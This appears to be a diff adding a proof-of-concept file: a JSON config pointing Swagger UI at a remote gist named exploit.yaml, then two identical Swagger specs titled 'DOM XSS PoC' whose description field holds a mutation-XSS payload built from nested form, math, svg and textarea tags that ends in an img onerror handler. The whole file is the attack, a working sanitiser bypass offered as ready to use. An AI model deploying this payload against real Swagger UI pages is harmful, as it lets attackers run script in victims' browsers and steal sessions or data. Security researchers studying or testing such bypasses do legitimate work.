@@ -1,0 +1,34 @@
+{
+    "url": "https://gist.githubusercontent.com/AMontesG/c89104d46f2bebc2a31795cc5c24c9b0/raw/a85952ddf7f9dfa921c3256d91edb5dbb7ee09b2/exploit.yaml",
+    "urls": [
+        {
+            "url": "https://gist.githubusercontent.com/AMontesG/c89104d46f2bebc2a31795cc5c24c9b0/raw/a85952ddf7f9dfa921c3256d91edb5dbb7ee09b2/exploit.yaml",
+            "name": "Foo"
+        }
+    ]
+}
+
+
+swagger: '2.0'
+info:
+  version: "0.0.1"
+  title: DOM XSS PoC
+  description: <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src=1>"></form>
+paths:
+  /:
+    get:
+      responses:
+        200:
+          description: Success
+          
+swagger: '2.0'
+info:
+  version: "0.0.1"
+  title: DOM XSS PoC
+  description: <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src=1>"></form>
+paths:
+  /:
+    get:
+      responses:
+        200:
+          description: Success
